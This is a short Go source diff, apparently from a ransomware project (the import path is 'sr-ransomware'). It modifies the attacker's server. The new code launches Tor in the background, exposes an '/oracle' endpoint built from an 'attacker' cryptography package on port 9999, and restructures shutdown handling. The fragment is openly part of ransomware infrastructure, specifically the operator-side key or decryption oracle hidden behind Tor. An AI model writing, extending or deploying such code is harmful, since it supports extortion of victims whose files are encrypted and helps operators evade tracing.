@@ -6,22 +6,30 @@ import (
     "net/http"
 
     "github.com/julienschmidt/httprouter"
+    "github.com/sug0/sr-ransomware/go/exe"
     "github.com/sug0/sr-ransomware/go/crypto/scheme/attacker"
 )
 
 func main() {
-    // TODO: start tor in background
+    // start tor in the background
+    tor := exe.NewTor("", os.Getenv("FLUTORRC"))
+
+    log.Println("Starting tor")
+    go tor.Start()
+    defer tor.Close()
+
+    // http router config
     router := httprouter.New()
     router.Handler("GET", "/oracle", attacker.NewOracle())
-    go handleSignals()
-    log.Fatal(http.ListenAndServe(":9999", loggingMiddleware(router)))
-}
 
-func handleSignals() {
+    // start server
     log.Println("Starting server")
+    go func(){
+        log.Fatal(http.ListenAndServe(":9999", loggingMiddleware(router)))
+    }()
+
     <-signalListener()
-    log.Println("Server exiting")
-    os.Exit(0)
+    log.Println("Exiting")
 }
 
 func loggingMiddleware(next http.Handler) http.Handler {
